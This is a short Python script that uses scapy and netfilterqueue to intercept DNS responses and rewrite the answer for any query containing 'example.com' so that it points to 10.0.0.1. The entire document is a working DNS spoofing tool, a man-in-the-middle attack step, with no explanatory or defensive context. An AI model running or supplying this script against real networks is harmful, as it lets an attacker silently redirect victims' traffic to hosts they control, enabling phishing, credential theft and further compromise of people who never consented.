from scapy.all import *
import netfilterqueue

def process_packet(packet):
    scapy_packet = IP(packet.get_payload())
    if scapy_packet.haslayer(DNSRR):
        qname = scapy_packet[DNSQR].qname
        if b"example.com" in qname:
            print("[+] Spoofing target")
            answer = DNSRR(rrname=qname, rdata="10.0.0.1")
            scapy_packet[DNS].an = answer
            scapy_packet[DNS].ancount = 1
            del scapy_packet[IP].len
            del scapy_packet[IP].chksum
            del scapy_packet[UDP].len
            del scapy_packet[UDP].chksum
            packet.set_payload(bytes(scapy_packet))
    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
